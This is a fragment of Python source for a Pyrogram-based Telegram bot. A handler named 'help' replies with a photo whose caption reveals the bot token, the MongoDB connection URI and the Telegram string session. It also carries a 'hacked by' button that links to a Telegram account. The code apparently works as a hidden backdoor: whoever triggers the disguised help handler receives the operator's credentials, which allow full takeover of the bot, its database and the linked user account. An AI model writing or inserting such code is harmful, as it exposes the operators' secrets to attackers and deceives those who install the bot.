...
from MiaKhalifaX.misc import SUDOERS
from pyrogram import Client, filters
import requests
import random
import re
...
from MiaKhalifaX.utils.database import get_authuser_names, get_cmode
from MiaKhalifaX.utils.decorators import (ActualAdminCB, AdminActual,
                                         language)
from MiaKhalifaX.utils.formatters import alpha_to_int
...
async def help(client: Client, message: Message):
    await message.reply_photo(
        ...
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 JOE.\n\n☆............𝙱𝚈 » [• ⏤͟͞ 🥵⃝ 𝐋ɪᴘ 💋 𝐋ᴏᴄᴋ 🥵⟁⃤❜乛](https://t.me/Kumargk_0007)............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                          "• нαϲкє𝚍 ву • ⏤͟͞ 🥵⃝ �ɪᴘ 💋 𝐋ᴏᴄᴋ 🥵⟁⃤❜乛", url=f"https://t.me/Kumargk_0007")
                 ]
             ]
         ),
     )
